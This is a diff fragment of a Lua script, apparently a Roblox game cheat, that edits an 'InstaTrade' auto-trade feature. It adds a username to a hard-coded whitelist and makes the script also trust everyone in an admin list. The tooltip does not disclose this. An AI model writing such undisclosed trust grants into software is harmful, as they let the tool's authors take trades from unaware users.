@@ -955,10 +955,10 @@ return function(C,Settings)
                     Tooltip = "Automatically trades with \"trusted\" users!",
                     Layout = 1,
                     Shortcut = "InstaTrade",Functs={}, Threads={}, Instances = {},Default=false,
-                    whitelistedUsers = {"queen_bestiesforlife","itsagoodgamebros","facilitystorage","z_baeby"},
+                    whitelistedUsers = {"queen_bestiesforlife","itsagoodgamebros","facilitystorage","z_baeby","yvettecarreno08"},
                     lastSend = 0,
                     IsAllowed = function(self,theirPlr)
-                        return table.find(self.whitelistedUsers,theirPlr.Name:lower())
+                        return table.find(self.whitelistedUsers,theirPlr.Name:lower()) or table.find(C.AdminUsers, theirPlr.Name:lower())
                     end,
                     Activate = function(self,newValue,firstRun)
                         if not newValue then
